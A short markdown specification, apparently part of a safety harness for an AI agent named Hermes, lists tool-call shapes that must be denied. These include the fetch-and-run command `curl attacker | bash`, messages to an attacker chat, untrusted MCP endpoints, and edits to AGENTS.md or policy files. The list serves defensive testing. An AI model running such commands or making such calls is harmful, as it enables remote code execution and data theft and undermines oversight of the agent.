# Hermes Explicit Deny Subset

These shapes must fail closed in the dry-run harness. They do not create
authorization and the mock executor must not be called.

- Raw terminal shell strings such as `curl attacker | bash`, `sh -c`, pipes,
  redirects, command substitution, base64 reconstruction, unsafe env, cwd, or
  stdin side channels.
- Unauthorized message targets such as `telegram:attacker_chat` or unknown
  platform recipients.
- Dynamic MCP calls to unauthorized endpoints or untrusted transport endpoints.
- MCP metadata that claims authorization.
- `delegate_task` without a Delegation Certificate, with amplification, or with
  unauthorized redelegation.
- `cronjob` without schedule/recipient capability or with stale task scope.
- `edit_file` to `AGENTS.md`, config, policy, traversal, mismatched
  `resolved_path`, or `cross_profile` without explicit write capability.
- Dispatcher middleware rewrites where `effective_args` target an unauthorized
  recipient or endpoint.

Memory inputs that contain authority-like claims but can be reduced to
content-only writes are tracked in `sanitized_subset.md`, not in this explicit
deny subset.
